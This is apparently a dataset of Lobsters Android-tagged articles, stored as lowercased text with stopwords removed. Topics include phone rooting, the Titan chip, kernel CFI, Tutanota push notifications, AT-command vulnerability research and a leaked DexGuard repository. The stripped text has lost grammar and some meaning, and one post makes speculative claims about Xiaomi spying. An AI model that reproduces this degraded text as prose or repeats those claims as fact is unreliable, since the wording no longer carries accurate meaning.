ship device except android one project device yes horrible extra feature problem lie deeper within one reason device xiaomi cheap afaik win margin sale include data mining ad system altogether miui way system apps requires extra unnecessary permission mine data bombard ad xiaomi earns money funnily enough weather app included wanted access contact make call would need would show weather another case recorder app also required contact internet permission probably send recording back xiaomi fix format phone get rid miui become increasingly difficult latest phone market concept formatting phone simple remove existing system install new one preference androidonly case bootloader unlocked bootloader computer program load operating system o runtime environment computer completion selftests wikipedia problem xiaomi specific policy bootloader unlocking month ago process like would make request xiaomi obtain unlock code phone giving valid reason would always work could refuse request without reason explanation process changed download specific software xiaomi called mi unlock install window mac linux pc activate debugging setting developer option phone reboot bootloader mode holding volume power button phone connect phone computer start process called approval process start timer xiaomi server allow unlock phone period day month rare case totally random go period day passed reconnect phone procedure pressing unlock button bootloader unlocked allow install rom system careful make sure backup data unlocking bootloader deletes everything phone next step would finding system rom work device searched xda developer forum place android developer user exchange idea apps etc fortunately phone quite popular forum category skimmed popular rom device decided use aosip rom aosip standing android open source illusion project edit someone emailed say article exactly e targeted wanted say thank reaching true reasoning behind opinion e also found website list reason eelo got funding kickstarter indiegogo promising create mobile o web service open secure protect privacy o based lineageos android microg open source apps already exists long time called lineage microg instead building apps source code download apks apkpure put rom without knowing apks contain proprietary codemalware one point literally removing lineage copyright header code adding love delete negative feedback censor opinion telegram group chat conclusion recommend using e rom least another thing would likely want root access phone make truly modify file system use systemwide adblocker etc decided use magisk godsend app developed student help gain root access device install called module basically software downloading rom magisk install phone moved file sd card phone install system use something called recovery system one use called twrp standing teamwin recovery project popular solution install recovery system sound hard know flash file phone connected phone computer fedora linux system something called adb tool issued command overwrites system recovery custom one fastboot flash recovery twrpimg done turned phone kept volume power button pressed saw twrp screen show meant good go ready receive command next step issue wipe command necessary first install custom rom phone see image wipe command clear data cache dalvik also advanced option allows u tick box delete system one need old one anymore take moment phone basically clean time install system pressing install button main screen select zip file added rom file swipe screen install next install magisk give u root access device edit experiencedpower android user might noticed gapps google apps included call gappsless android world package installed note one downside google service installed apps might work example notification might take longer arrive might even work happens mattermost app happens apps use google cloud messaging called firebase wake phone push notification phone solve partially installing using microg provides feature google service allows control side recommend using still help google service really give good start want quit google slowly go cold turkey successfully installing reboot phone tada main screen next part installing apps configuring everything thing start get easier install apps use fdroid alternative app store includes free open source apps need apps available use aurora store client download apps play store without using google account getting tracked fdroid called repos storehouse contains apps install use default one added another one izzyondroid contains apps available default fdroid repo updated often find list apps installed replace use adaway adblocker system block ad everywhere using host file afwall firewall allows block unwanted connection amaze replaces system file manager allows root access file also zipunzip capability ameixa icon pack many icon apps andotp replaces google authenticatorauthy totp app use login site account enabled allows backup locking pin anysoftkeyboardaosp keyboard open source keyboard many theme language pack also part project audio recorder say allows record audio file different format microphone battery charge limit automatically stop charging phone reach lower battery wear increase longevity one mostused apps basically replaces google contact google calendar google task connected nextcloud instance control data document viewer viewer app open hundred file format fast lightweight deezloader remix app allows download high quality file deezer easy xkcd xkcd comic reader love comic etar calendar app replaces google calendar work fasthublibre github client entirely fo useful use github extensively like fennec fdroid alternative google chrome others branded firefox browser fdroid without proprietary blobsbinaries updated allows install extension improve browsing experience gadgetbridge alternative mi fit application used pair xiaomi hardware phone track health step sleep etc mail email client replaces gmail app customizable add many email account wish lawnchair launcher replace nova launcher pixel launcher allows customization various change also support icon pack mattermost app allows connect mattermost server mattermost alternative slack newpipe best youtube client imo replaces youtube entirely fo get rid youtube ad lower data usage allows background play allows download videoaudio etc try nextcloud sm allows backupsync sm nextcloud instance nextcloud note allows create edit delete share note syncbackup nextcloud instance opentasks allows create edit delete task sync nextcloud instance osmand map app alternative google map us openstreetmap allows offline map download navigation qksms favorite sm app replaces stock messaging app beautiful interface allows backup customization delayed sending feature etc resplashmysplash allows download beautiful endless wallpaper unsplash free use modify screencam screen recorder allows various customizations recording mode ad free secscanqr qr scanner app really fast lightweight send reduced free app allows share big image instantly reducing removing pii personally identifiable information sending someone slide open source reddit client telegram fo clean version telegram android client without tracker google service trebleshot ingenius app allows share file wifi connection really fast way without even internet access device tusky tusky client mastodon platform mastodon replaces twitter unit converter ultimate app allows convert unit snap work fully offline fast vinyl music player preferred music player app replaces google play music whatever already installed phone beautiful interface many feature vpn hotspot app allows share vpn enabled phone hotspot browse securely even laptop without anything else pretty much list useful fdroid apps use unfortunately apps use proprietary apps use know might sound hypocrite everything replaceable yet least google camera coupled camera api need basic microg fdroid work myvodafoneal carrier app protonmail email app titanium backup backup app data wifi password call log etc whatsapp proprietary messaging app almost everyone know pretty much apps use phone configs pretty simple straightforward give tip read check permission apps carefully click install mindlessly try use many open source apps possible respect privacy free free beer freedom use vpn much find reputable one use free one otherwise get product get data harvested keep wifimobile datalocation time might security risk try rely fingerprint unlock better yet use pinpasswordpattern unlock biometric data cloned used example unlock phone steal data bonus reading far screenshot home screen right content licensed cc byncsa attributionnoncommercialsharealike international
143,Lobsters,android,Android,A Little Scheme Setup and Development on the Galaxy S9 Plus,http://www.blogbyben.com/2018/04/a-little-scheme-setup-and-development.html,little scheme setup development galaxy plus,termux tinyscheme external keyboard helper programmingpraxiscom rendering text unique way sevensegment device exercise,today goal setup scheme programming environment new galaxy plus phone planned use tool used lg termux provides unixy environment nt require root plain awesome tinyscheme provides lightweight yet powerful scheme environment bonus point trivial install within termux type pkg install tinyscheme emacs vim git tool run well termux installed using pkg install command use emacs config phone desktop external keyboard helper remaps key hardware keyboard specifically use map cap lock escape found keybinding essential making bash emacs vim work sane way tool installed able open new scm file emacs type cu mx runscheme tinyscheme running interactive scheme development environment tool installed without issue could nt consider environment setup wrote code went programmingpraxiscom find interesting exercise tackle sticking theme rendering text unique way decided complete sevensegment device exercise sevensegment device primitive display render number text using seven different lit bar think old school calculator seven different segment work find solution turn integer text rendered using sevensegment style exercise called storing data bitarray took alternative approach mapped every digit number list enabled segment example map verbose packing data bit interested rendering text storing compact representation screenshots code running code felt good coding new phone sure remarkable well tool work http define show args display args newline define range lower upper lower upper con lower range lower upper define digitwidth define digitheight define digitsep define digitmap define integer bar val val cdr assoc digitmap let loop val val bar cond val bar else let modulo val loop inexact exact floor val con cdr assoc digitmap bar define drawsep foreach lambda display range digitsep define draw first mid last display first foreach lambda display mid range digitwidth display last define drawrow digit row define mid digitheight define top row define bottom row digitheight define mid row mid define upper top row mid define lower bottom row mid foreach lambda bar define x member x bar cond top draw bottom draw mid draw upper draw upper draw upper draw lower draw lower draw lower draw else draw drawsep digit newline define drawinteger x define integer bar x newline foreach lambda row drawrow row range digitheight x
144,Lobsters,android,Android,Why I'm Ditching Android,https://kevq.uk/why-im-ditching-android/,ditching android,degoogling life thing replace massive fail google ad vortex digital content next paper summary paper bleeping computer bloatware notification iphone se conclusion ditched android ditched io let know thought,regular reader blog know went process degoogling life ago part think process pretty successful however thing replacefast forward year lot trial error ready take next step removing google life ditching androidfirst tried ditch smartphone completely massive fail tried replacing android lineage o old phone whilst meant google apps device still android underneath also many apps kept complaining google service device got old quickso last night decided ditching android completely ordered apple iphone se probably think jumped frying pan fire let explain rationale behind google ad vortexunless living rock last decade sure probably aware google business model based around advertising make money lot service free producton hand apple business model based around hardware yes hardware grossly overpriced flagship android phone pretty much inline apple day moot point reallybecause google make money advertising best interest get much information possible need look recent digital content next paper proved android sends data back google apple doeshere good summary paper bleeping computer bothered reading pagesbloatwareandroid vendor almost bad window come bundling additional application device almost meme point least window uninstall bloatware bloatware android device used year removed marked system appsand want remove google proprietary apps like google drive google search google photo forget system apps uninstalledthe also true io certain degree however android much prevalent use hicare huawei weather huawei music let bloody remove notificationsin last update received android around month ago new battery saving measure implemented whilst battery life huawei really good done something funky notificationsi hardly ever get notification email calendar event social medium etc assume battery saving measure kill background process apps carry background task like checking new emaili tried work around using battery optimisation setting android get work number occasion missed important email phone decides want notify mewhy iphone se gon na flip apple get latest device right well one pet hate phone day sheer size basically tablet pocket want phonethe iphone se actually phone sized device cheap still supported apple seemed like nobrainer give tryconclusioni doubt issue flipping iphone se already ipad whilst perfect solution ditching android favour io another step towards getting rid googlei never going completely get rid google impossible point think right decision se get delivered week post update month use let guy know getting onhave ditched android ditched io let know thought
146,Lobsters,android,Android,Building a Titan: Better security through a tiny chip,https://security.googleblog.com/2018/10/building-titan-better-security-through.html,building titan better security tiny chip,android developer blog made google keyword blog titan family post android verified boot weaver api android strongbox keymaster trusted user presence protected confirmation fido insider attack resistance rowhammer spectre meltdown closer look titan better security transparency innovation,posted nagendra modadugu bill richardson google device security group crossposted android developer blog made google event last week talked combination ai software hardware help organize information better protect information hardware level new pixel pixel xl device include titan chipwe briefly introduced titan benefit keyword blog post dive technical detail titan secondgeneration lowpower security module designed manufactured google part titan family described keyword blog post titan performs several security sensitive function including storing enforcing lock rollback counter used android verified boot securely storing secret ratelimiting invalid attempt retrieving using weaver api providing backing android strongbox keymaster module including trusted user presence protected confirmation titan direct electrical connection pixel side button remote attacker ca nt fake button press feature available thirdparty apps fido authentication enforcing factoryreset policy lost stolen phone restored operation authorized owner ensuring even google ca nt unlock phone install firmware update without owner cooperation insider attack resistance including titan pixel device substantially reduces attack surface titan separate chip physical isolation mitigates entire class hardwarelevel exploit rowhammer spectre meltdown titan processor cache memory persistent storage shared rest phone system side channel attack like rely subtle unplanned interaction internal circuit single nearly impossible addition physical isolation titan chip contains many defense protect external attack titan hardened security microcontroller rather fulllifecycle approach security pixel device mind titan security take consideration feature visible android lowest level physical electrical circuit design extends beyond physical device supply chain manufacturing process physical level incorporated essential feature optimized mobile experience low power usage lowlatency hardware crypto acceleration tamper detection secure timely firmware update improved invested supply chain titan creating custom provisioning process provides u transparency control starting earliest silicon stage finally interest transparency titan firmware source code publicly available soon google hold root key necessary sign titan firmware possible reproduce binary build based public source purpose binary transparency closer look titan titan left titan right titan cpu arm microprocessor specially hardened sidechannel attack augmented defensive feature detect respond abnormal condition titan cpu core also expose several control register used taper access chip configuration setting peripheral powered titan verifies signature flashbased firmware using public key built chip silicon signature valid flash locked ca nt modified firmware begin executing titan also feature several hardware accelerator aes sha programmable big number coprocessor public key algorithm accelerator flexible either initialized key provided firmware chipspecific hardwarebound key generated key manager module chipspecific key generated internally based entropy derived true random number generator trng thus key never externally available outside chip entire lifetime implementing titan firmware take many system constraint consideration example packing many security feature titan kbytes ram required firmware execute exclusively stack reduce flashwear ram content preserved even lowpower mode hardware module turned diagram provides highlevel view chip component described better security transparency innovation heart implementation titan two broader trend transparency building platform future innovation transparency around every step design process logic gate boot code application give u confidence defense providing user know inside got work make change custom hardware allows u provide new feature capability performance readily available offtheshelf component change allow higher assurance use case like twofactor authentication medical device control payment others help develop road life bound phone keeping phone secure trustworthy increasingly important google take responsibility seriously titan latest step continuing effort improve privacy security user
147,Lobsters,android,Android,Google and Android have your back by protecting your backups,https://security.googleblog.com/2018/10/google-and-android-have-your-back-by.html,google android back protecting backup,,latest news insight google security safety internet
148,Lobsters,android,Android,Introducing Oboe: A C++ library for low latency audio,https://android-developers.googleblog.com/2018/10/introducing-oboe-c-library-for-low.html,introducing oboe c library low latency audio,oboe single api aaudio opensl e native audio le code write maintain benefit getting started documentation code sample api reference codelab please file,posted turner developer advocate android audio framework week released first productionready version oboe c library building realtime audio apps oboe provides lowest possible audio latency across widest range android device well several benefit single api oboe take advantage improved performance feature aaudio oreo api whilst maintaining backward compatibility using opensl e api kind like androidx native audio le code write maintain using oboe create audio stream line code v line opensl e audiostreambuilder builder audiostream stream nullptr result result builderopenstream stream benefit convenient c api us standard fast release process supplied source library bug fix rolled day quite bit faster android platform release cycle le guesswork provides workarounds known audio bug sensible default behaviour stream property sample rate audio data format open source maintained google engineer although welcome outside contribution getting started take look short video introduction video check documentation code sample api reference even codelab show build rhythmbased game issue please file love hear get
149,Lobsters,android,Android,Control Flow Integrity in the Android kernel,https://android-developers.googleblog.com/2018/10/control-flow-integrity-in-android-kernel.html,control flow integrity android kernel,hardening kernel compilerbased security mitigation control flow integrity cfi cfi support available android kernel version protecting code reuse attack gaining full program visibility link time optimization lto implementing cfi linux kernel llvm cfi crossdso cfi enabling kernel cfi android device clang binutils kasan conclusion shadow call stack,posted sami tolvanen staff software engineer android security android security model enforced linux kernel make tempting target attacker put lot effort hardening kernel previous android release android continued work focusing compilerbased security mitigation code reuse attack google pixel first android device ship llvm forwardedge control flow integrity cfi enforcement kernel made cfi support available android kernel version post describes kernel cfi work provides solution common issue developer might run enabling feature protecting code reuse attack common method exploiting kernel using bug overwrite function pointer stored memory stored callback pointer return address pushed stack allows attacker execute arbitrary part kernel code complete exploit even inject executable code method gaining code execution particularly popular kernel huge number function pointer us existing memory protection make code injection challenging cfi attempt mitigate attack adding additional check confirm kernel control flow stay within precomputed graph nt prevent attacker changing function pointer bug provides write access one significantly restricts valid call target make exploiting bug difficult practice figure android device kernel llvm cfi limit indirect call possible target target gaining full program visibility link time optimization lto order determine valid call target indirect branch compiler need see kernel code traditionally compiler work single compilation unit source file time leave merging object file linker llvm solution cfi require use lto compiler produce llvmspecific bitcode c compilation unit ltoaware linker us llvm backend combine bitcode compile native code figure simplified overview lto work kernel llvm bitcode combined optimized generated native code link time linux used gnu toolchain assembling compiling linking kernel decade continue use gnu assembler standalone assembly code lto requires u switch llvm integrated assembler inline assembly either gnu gold llvm lld linker switching relatively untested toolchain huge software project lead compatibility issue addressed lto patch set kernel version addition making cfi possible lto also produce faster code due global optimization however additional optimization often result larger binary size may undesirable device limited resource disabling ltospecific optimization global inlining loop unrolling reduce binary size sacrificing performance gain using gnu gold aforementioned optimization disabled following addition ldflags ldflags note flag disable individual optimization part stable llvm interface may change future compiler version implementing cfi linux kernel llvm cfi implementation add check indirect branch confirm target address point valid function correct signature prevents indirect branch jumping arbitrary code location even limit function called c compiler enforce similar restriction indirect branch several cfi violation due function type declaration mismatch even core kernel addressed cfi patch set kernel kernel module add another complication cfi loaded runtime compiled independently rest kernel order support loadable module implemented llvm crossdso cfi support kernel including cfi shadow speed crossmodule lookup compiled crossdso support kernel module contains information valid local branch target kernel look information correct module based target address module memory layout figure example crossdso cfi check injected kernel type information passed target address validate cfi check naturally add overhead indirect branch due aggressive optimization test show impact minimal overall system performance even improved many case enabling kernel cfi android device cfi requires clang version binutils kernel build system also assumes llvmgoldso plugin available ldlibrarypath prebuilt toolchain binary clang binutils available aosp upstream binary also used following kernel configuration option needed enable kernel cfi configltoclangy configcficlangy using configcfipermissivey may also prove helpful debugging cfi violation device bringup option turn violation warning instead kernel panic mentioned previous section common issue ran enabling cfi pixel benign violation caused function pointer type mismatch kernel run violation print runtime warning contains call stack time failure call target failed cfi check changing code use correct function pointer type fix issue fixed known indirect branch type mismatch android kernel similar problem may still found device specific driver example cfi failure target cut kernel bug internal error oops bug preempt smp call trace figure example kernel panic caused cfi failure another potential pitfall address space conflict le common driver code llvm cfi check understand kernel virtual address code run another exception level make indirect call physical address result cfi violation type failure addressed disabling cfi single function using nocfi attribute even disabling cfi entire code file using disablecfi compiler flag makefile static int nocfi addressspaceconflict void fn void branching physical address trip cfi wo nocfi fn void pasymbol functionname cpuinstallidmap fn cpuuninstallidmap figure example fixing cfi failure caused address space conflict finally like many hardening feature cfi also tripped memory corruption error might otherwise result random kernel crash later time may difficult debug memory debugging tool kasan help conclusion implemented support llvm cfi android kernel google pixel first android device ship protection made feature available device vendor android common kernel shipping new device running android strongly recommend enabling kernel cfi help protect kernel vulnerability llvm cfi protects indirect branch attacker manage gain access function pointer stored kernel memory make common method exploiting kernel difficult future work involves also protecting function return address similar attack using llvm shadow call stack available upcoming compiler release
151,Lobsters,android,Android,Manyverse mobile scuttlebutt client,https://www.manyver.se/,manyverse mobile scuttlebutt client,familiar yet radically new data live entirely phone syncs latest update directly,familiar yet radically newmanyverse social network mobile app feature would expect post thread like profile etc running cloud owned company instead friend post social data live entirely phone way even offline scroll read anything even write post like content phone back online syncs latest update directly friend phone shared local wifi internet building free open source project community effort believe noncommercial neutral fair mobile communication everyone
153,Lobsters,android,Android,How Tutanota replaced Google’s FCM with their own notification system,https://f-droid.org/en/2018/09/03/replacing-gcm-in-tutanota.html,tutanota replaced google fcm notification system,week fdroid ivan tutanota challenge replace fcm publish android app fdroid replaced fcm sse sse federated network mastodon get tutanota app fdroid final thought every user able choose every app,mentioned week fdroid tutanota fdroid special post ivan tutanota tell u story hi ivan developing tutanota help build web future right privacy respected believe privacy luxury rich techsavvy basic human right gcm called fcm firebase cloud messaging service owned google tutanota used fcm old android app unfortunately fcm includes tracking code analytics purpose want use even important able use fcm send notification data google also use proprietary library privacy security concern naturally go along send info notification message old app understandably led complaint user therefore push notification old app mentioned received new message without reference email mailbox message placed fcm quite convenient use year google made change android made harder use service notification hand giving notification service would free u requiring user google play service phone challenge replace fcm tutanota apps libre software wanted publish android app fdroid wanted user able use tutanota every rom every device without control thirdparty like google decided take challenge build push notification service started designing push system several goal mind must secure must fast must powerefficient made research others signal wire conversation riot facebook mastodon solving similar problem several option mind including websockets mqtt server sent event server push replaced fcm sse settled sse server sent event seemed like simple solution mean implement easy debugging type thing major headache one underestimate factor another argument favour sse relative power efficiency need upstream message constant connection goal sse sse web api allows server send event connected client relatively old api opinion underused never heard sse looking federated network mastodon use sse realtime timeline update working great protocol simple resembles good old polling client open connection server keep open difference classical polling keep connection open multiple event server send event data message separated new line thing client need open connection big timeout read stream loop sse fit need better websocket would cheaper converges faster duplex seen multiple chat apps trying using websocket push notification seem power efficient experience websocket already knew firewall like keepalive connection solve used workaround sse websocket send empty message every minute made interval adjustable server side randomised overwhelm server noted tutanota app multiaccount support posed challenge u wanted keep one connection open per device iteration found design satisfied u device one identifier opening connection client sends list user want receive notification server validates list user record filter invalid one user may delete notification token setting would affect logins device addition build delivery tracking mechanism notification received unfortunately discovered server unable detect connection broken send confirmation client side receive notification leverage android capability run background service keep connection server open similar fcm process another difficulty caused doze mode introduced android doze turned period inactivity among thing prevents background process access network imagine prevents app receiving notification mitigate problem asking user make exemption battery optimisation app worked fairly well similar problem unrelated doze vendorspecific battery optimisation order prolong battery life device phone manufacturer like xiaomi enable strict battery optimisation default luckily user disable must communicate better another problem caused android change one background process restriction unless app visible user background process going stopped unable launch new one initially thought solve showing persistent notification minimal priority visible notification gutter status bar work oreo try launch background service use priority minimum notification notification priority upgraded higher priority visible time addition system show another persistent notification x using initially planned explain user hide persistent notification great user experience find better solution leveraged android job mechanism launch service periodically least every minute also try keep alive afterwards hold wakelocks manually system u able ditch persistent notification altogether even notification sometimes small delay always received email instantly end work totally worth new app still beta thanks nonblocking io able maintain thousand simultaneous connection without problem freed user google play service requirement finally everyone able get tutanota app fdroid system combine good power efficiency speed final thought every user able choose every app great user could pick notification phone setting o managed hard detail every app want policed platform owner invent system anew could endtoend encrypted app app server real technical difficulty long system controlled big player allow solve
155,Lobsters,android,Android,Comprehensive Vulnerability Analysis of AT Commands Within the Android Ecosystem,https://atcommands.org/,comprehensive vulnerability analysis command within android ecosystem,research artifact view database view code read paper reference faq command command android smartphones affect found vulnerability find remotely exploitable vulnerability list device affect x grant hernandez dave tian kevin butler press coverage exploiting decadesold telephone tech break android device command hitch leaf android phone open attack smartphone security risk compared ghost user phone hack uf research reveals smartphones hacked via usb smartphones oems vulnerable attack via hidden command protect public usb charging port smartphones oems including google samsung htc lenovo sony vulnerable attack via hidden command attention spanned comprehensive android vulnerability analysis command android mobile device vendor exposed command attack android mercy command android smartphones hacked command attack android smartphone hacked simple command modern smartphones vulnerable oldschool attack open command huge loophole exploit android revealed vulnerability found major manufacturer android phone smartphones vulnerable hacking command ancient modem new security risk smartphones brings ghost user command androidsmartphones durch modembefehle verwundbar у производителей androidсмартфонов обнаружили уязвимость к atкомандам злоумышленники могут получить полный удаленный доступ к androidустройству через порт публичной usbзарядки miliony smartfonów można zhackować ukrytymi komendami acknowledgment,command originally designed early controlling modem still use modern smartphones support telephony function role command device vastly expanded vendorspecific customizations yet extent functionality unclear poorly documented work systematically retrieved extracted command android smartphone firmware image across vendor methodically tested corpus command eight android device four different vendor usb interface characterize powerful functionality exposed including ability rewrite device firmware bypass android security mechanism exfiltrate sensitive device information perform screen unlocks inject touch event solely use command demonstrated command interface contains alarming amount unconstrained functionality represents broad attack surface android device research artifact spur research command releasing web interface database command discovered detail process extracting command view paper interested code used project check github finally see demonstration command controlling phone view video view database view code read paper video reference research benefited work please use following bibtex cite paper inproceedings author dave tian grant hernandez joseph choi vanessa frost christie ruales kevin butler patrick traynor hayawardh vijayakumar lee harrison amir rahmati mike grace title attention spanned comprehensive vulnerability analysis command within android ecosystem booktitle usenix security symposium usenix security year isbn address baltimore md page url http publisher usenix association faq command attention command first developed dennis hayes controlling modem command accepted modem data mode without needing separate port allow selection communication protocol setting line speed dialing number hanging call etc since inception command become preferred mean controlling modem standardized command set issued authority international telephone union itut european telecommunication standard institute etsi command android smartphones smartphones contain cellular baseband processor provide modem functionality allowing device communicate cellular network accept command configuration beyond standardized modem command found android device manufacturer add customproprietary command extended command often invoke telephonyrelated functionality instead access resource device affect android smartphones command interface exposed usb without usb debugging enabled unfortunately device authenticate interface allow used lockscreen found case chargeonly usb mode may also fail block command mean unsuspecting user plug phone usb port charging data transfer may device locally compromised possibly prerecorded sequence command furthermore many command exfiltrating sensitive data visible sideeffects found vulnerability yes notified vendor relevant finding worked security team remediate issue lg assigned vulnerability number find remotely exploitable vulnerability investigation centered device usb connection investigate remote attack surface first place would look would bluetooth interface baseband list device affect full paper linked could test every device tried study previous work x question answered page paper please reach author twitter grant hernandez dave tian kevin butler via email page footer press coverage exploiting decadesold telephone tech break android device wired command hitch leaf android phone open attack threatpost article smartphone security risk compared ghost user phone uf news article hack uf research reveals smartphones hacked via usb independent florida alligator article smartphones oems vulnerable attack via hidden command bleepingcomputer article protect public usb charging port howto geek article smartphones oems including google samsung htc lenovo sony vulnerable attack via hidden command slashdotorg post attention spanned comprehensive android vulnerability analysis command hacker news mention android mobile device vendor exposed command attack security affair article android mercy command fudzilla article android smartphones hacked command attack tech worm article android smartphone hacked simple command fossbytes article modern smartphones vulnerable oldschool attack kim komando show article open command huge loophole exploit android revealed hacker combat community article vulnerability found major manufacturer android phone securepoint blog article smartphones vulnerable hacking command ancient modem hybrid techcar article new security risk smartphones brings ghost user android community article command sans daily network security podcast stormiest monday august androidsmartphones durch modembefehle verwundbar golemde article у производителей androidсмартфонов обнаружили уязвимость к atкомандам tproger article злоумышленники могут получить полный удаленный доступ к androidустройству через порт публичной usbзарядки habr article miliony smartfonów można zhackować ukrytymi komendami niebezpiecznik article acknowledgment like thank samsung research america kickstarting initial research dave tian internship lending u android device testing work supported national science foundation grant
156,Lobsters,android,Android,Stolen Android Anti-Piracy Software Dumped on Github,https://torrentfreak.com/stolen-android-anti-piracy-software-dumped-on-github-180818/,stolen android antipiracy software dumped github,dexguard takedown notice account previously described,home news tool protect android software piracy tampering cloning attack taken illegally posted github version nexguard exposed code repository stolen customer guardsquare software creator following dmca notice sent github tool removed dozen antipiracy system world designed protect everything music movie tv show videogames software year gone many made mistake claiming impenetrable history shown protection act mere stumbling block slow leak piracy unusual hear antipiracy tool leaked online appears case code belonging security company guardsquare appeared online develop premium software protection mobile application reverse engineering hacking company website read product used across world broad range industry financial service ecommerce public sector telecommunication gaming medium one guardsquare product dexguard tool protect android application decompiled something lead piracy credential harvesting tampering cloning unfortunately version dexguard ended github takedown notice filed microsoftowned code platform guardsquare explains code unauthorized obtained illegally listed older version commercial obfuscation software dexguard android application folder part larger code base stolen one former customer guardsquare writes repository containing illegal copy dexguard quickly taken leaked code already spread guardsquare found almost fork stolen software github filed request taken taken place account github user originally uploaded content seems intact using name hackedteam account contains code dating back several year appears linked android spyware previously described one professionally developed sophisticated android malware ever exposed
157,Lobsters,android,Android,Introducing Android 9: Pie,https://android-developers.googleblog.com/2018/08/introducing-android-9-pie.html,introducing android pie,seven device maker partner android open source project aosp powerful new capability google play game android smarter smartphone machine learning core adaptive battery deepmind adaptive battery doze app standby background limit power documentation slice slice app action app action text classifier smart linkify textclassifier api linkify api neural network api neural network api neural network tensorflow lite getting phone easily new system navigation display cutout display cutout support display cutout apis notification smart reply messagingstyle ml kit text magnifier magnifier widget magnifier widget recent blog post precomputedtext security privacy user biometric prompt biometricprompt api biometricprompt api post protected confirmation android protected confirmation stronger protection private key keystore keygenparameterspec dns tl linkpropertiesisprivatednsactive post http default network security configuration compilerbased security mitigation post privacy user sensormanager readphonestate buildgetserial new experience camera audio graphic multicamera api camera update two physical camera session parameter flash support ois timestamps hdr video heif image compression heif imagedecoder bitmapfactory heifwriter enhanced audio dynamic processing dynamic processing api imagedecoder bitmap drawables imagedecoder connectivity location wifi rtt indoor positioning rtt apis data cost sensitivity jobscheduler jobscheduler doze app standby background limit open mobile api nfc payment secure transaction globalplatform open mobile api omapi api performance apps art performance optimized kotlin firstclass language android modern android last year targetsdkversion checklist resource get apps ready android emulator behavior change recent post enhance app android feature apis new feature apis android studio behavior change google play beta testing feature android site video google io android playlist coming device near available android open source project next file new issue,posted dave burke vp engineering year development month testing early adopter ready launch android pie latest release android world android harness power machine learning make phone smarter simpler tailored read new consumer feature developer android includes many new way enhance apps build new experience drive engagement given u ton feedback along way thousand bug feature request thank tried preview build android beta program seven device maker partner also brought beta flagship device enabling user around world give feedback today pushing source code android open source project aosp starting android rollout pixel user worldwide android coming many device coming month continue move android forward premier open platform developer worldwide build business android together powerful new capability google play apps game committed helping build great experience well reach engage right user safely costeffectively around world android smarter smartphone machine learning core android help phone learn use picking preference adjusting automatically everything helping user get battery life surfacing best part apps use time right need android keep thing running smoother longer adaptive battery partnered deepmind feature called adaptive battery us machine learning prioritize system resource apps user care app optimized doze app standby background limit adaptive battery work well right box nt yet taken optimized app make sure check detail power documentation see work slice slice help user perform task faster enabling engagement outside fullscreen app experience using ui template display rich dynamic interactive content app within google search app later place like google assistant learn building slice enhance app app action app action new way raise visibility app drive engagement action take advantage machine learning surface app user right time based app semantic intent user context sharing detail coming week registering app handle one user intent apps enabled app action surfaced across multiple google android surface response user query text classifier smart linkify extended ml model identify entity content text input support type like date flight number textclassifier api smart linkify let take advantage textclassifier model linkify api including enriched option quick followon user action smart linkify also delivers significant improvement accuracy detection well performance neural network api android add updated version neural network api extend android support accelerated ondevice machine learning neural network add support nine new ops pad batchtospacend spacetobatchnd transpose strided slice mean div sub squeeze typical way take advantage apis tensorflow lite getting phone easily excited making smartphone intelligent also important technology fade back user android evolved android ui simpler approachable developer change help improve way user find use manage apps new system navigation android introduces new system navigation working year new design help make android multitasking approachable make discovering apps much easier swipe anywhere see fullscreen preview recently used apps simply tap jump back one display cutout app take full advantage latest edgetoedge screen display cutout support android apps supporting display cutout seamless system managing status bar height separate content cutout immersive content use display cutout apis check position shape cutout request fullscreen layout around help development testing added developer option simulates several cutout shape device apps immersive content display content fullscreen device display cutout notification smart reply android make notification even useful actionable messaging apps take advantage new messagingstyle apis show conversation attach photo sticker even suggest smart reply soon able use ml kit generate smart reply suggestion app messagingstyle notification conversation smart reply left image sticker right text magnifier android added magnifier widget improve user experience selecting text magnifier widget let user precisely position cursor text selection handle viewing zoomed text draggable pane attach view attached window use custom widget custom textrendering magnifier widget also provide zoomedin version view surface text check recent blog post text feature precomputedtext line height baseline text alignment security privacy user biometric prompt range biometric sensor use authentication made experience consistent across sensor type apps android introduces systemmanaged dialog prompt user supported type biometric authentication apps longer need build dialog instead use biometricprompt api show standard system dialog addition fingerprint including indisplay sensor api support face iris authentication app drawing fingerprint auth dialog switch using biometricprompt api soon possible see post information protected confirmation android introduces android protected confirmation us trusted execution environment tee guarantee given prompt string shown confirmed user successful user confirmation tee sign prompt string app verify stronger protection private key added strongbox new keystore type providing api support device provide key storage tamperresistant hardware isolated cpu ram secure flash set whether key protected strongbox security chip keygenparameterspec dns tl android add builtin support dns tl automatically upgrading dns query tl network dns server support user manage dns tl behavior new private dns mode network internet setting apps perform dns query use new api linkpropertiesisprivatednsactive check dns mode post http default part larger effort move network traffic away cleartext unencrypted http website secured tl http changing default network security configuration block cleartext traffic need make connection tl unless explicitly optin cleartext specific domain see detail compilerbased security mitigation android expanded use compilerlevel mitigation harden platform runtime detection dangerous behavior control flow integrity cfi technique help prevent codereuse attack arbitrary code execution android greatly expanded cfi usage within medium framework securitycritical component nfc bluetooth also introduced cfi kernel support android common kernel building llvm also expanded use integer overflow sanitizers mitigate memorycorruption informationdisclosure vulnerability prioritized sanitizers library past vulnerability complex untrusted input processed libui libnl libmediaplayerservice others see post detail privacy user android safeguard privacy number new way system restricts access mic camera sensormanager sensor apps idle app uid idle mic report empty audio sensor stop reporting event camera used app disconnected generate error app try use case restriction introduce new issue existing apps recommend removing request apps android also give user control access platform buildserial identifier putting behind readphonestate permission access buildserial identifier use buildgetserial method read privacy change new experience camera audio graphic multicamera api camera update android open stream two physical camera simultaneously device support multicamera api device either dualfront dualback camera create innovative feature possible single camera seamless zoom bokeh stereo vision api also let call logical fused camera stream automatically switch two camera improvement camera include new session parameter help reduce delay initial capture surface sharing let camera client handle various usecases without need stop start camera streaming also added apis displaybased flash support access ois timestamps applevel image stabilization special effect hdr video heif image compression android add builtin support hdr profile deliver hdrenabled movie user hdrcapable device excited add heif heic image encoding platform heif popular format photo improves compression save storage network data platform support android device easy send utilize heif image backend server made sure app compatible data format sharing display give heif try image storage format app jpegtoheic conversion using imagedecoder bitmapfactory obtain bitmap jpeg use heifwriter androidx library write heif still image yuv byte buffer surface bitmap enhanced audio dynamic processing dynamic processing api let use new audio effect isolate specific frequency lower loud increase soft sound enhance acoustic quality app example improve sound someone speaks quietly loud distant otherwise acoustically challenging environment api give access multistage multiband dynamic processing effect includes preequalizer multiband compressor postequalizer linked limiter imagedecoder bitmap drawables imagedecoder api give easier way decode image bitmap drawables create bitmap drawable byte buffer file uri api offer several advantage bitmapfactory including support exact scaling 